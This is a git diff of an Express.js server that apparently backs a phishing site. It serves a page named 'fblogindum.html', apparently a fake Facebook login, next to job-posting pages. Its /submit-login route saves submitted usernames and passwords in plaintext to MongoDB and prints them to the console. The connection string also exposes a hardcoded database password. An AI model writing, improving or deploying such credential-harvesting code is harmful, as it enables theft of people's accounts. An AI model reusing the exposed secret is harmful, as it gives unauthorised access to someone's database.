@@ -2,13 +2,12 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const fs = require('fs');
 const path = require('path');
+const { MongoClient } = require('mongodb');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const { MongoClient } = require('mongodb');
-
-const uri = "mongodb+srv://garycantilang:<0xMkSE6i57Nm5hUd>@cluster0.cygdj.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
+const uri = "mongodb+srv://garycantilang:<0xMkSE6i57Nm5hUd>@cluster0.cygdj.mongodb.net/logdata?retryWrites=true&w=majority&appName=Cluster0";
 const client = new MongoClient(uri);
 
 let db; // Declare the db variable
@@ -16,10 +15,10 @@ let db; // Declare the db variable
 async function connectToDatabase() {
     try {
         await client.connect();
-        db = client.db('<logdata>'); // Assign your database name here
+        db = client.db('logdata'); // Your actual database name
         console.log("Connected to MongoDB");
     } catch (error) {
-        console.error("MongoDB connection error:", error);
+        console.error("MongoDB connection error:", error.message || error);
     }
 }
 
@@ -36,17 +35,13 @@ app.post('/submit-login', async (req, res) => {
     try {
         if (!db) {
             console.error("Database connection not initialized.");
-            throw new Error("Database connection not initialized");
+            return res.status(500).send('Database connection not initialized.');
         }
         
         const loginData = { username, password, timestamp: new Date() };
-        
-        // Log before inserting data
         console.log("Attempting to insert data:", loginData);
         
         const result = await db.collection('ifsh').insertOne(loginData);
-        
-        // Log the result after successful insertion
         console.log("Data inserted successfully:", result);
         
         res.send('Login information saved successfully to MongoDB.');
@@ -56,18 +51,18 @@ app.post('/submit-login', async (req, res) => {
     }
 });
 
-// Route to serve the homepage
+// Routes to serve HTML files
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'Home.html')); // Change 'index.html' to your main HTML file name
+    res.sendFile(path.join(__dirname, 'Home.html'));
 });
 app.get('/Job Postings.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'Job Postings.html')); // Change 'index.html' to your main HTML file name
+    res.sendFile(path.join(__dirname, 'Job Postings.html'));
 });
 app.get('/Announcements.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'Announcements.html')); // Change  'index.html' to your main HTML file name
+    res.sendFile(path.join(__dirname, 'Announcements.html'));
 });
 app.get('/public/fblogindum.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'fblogindum.html')); // Change 'index.html' to your main HTML file name
+    res.sendFile(path.join(__dirname, 'fblogindum.html'));
 });
 
 // Start the server
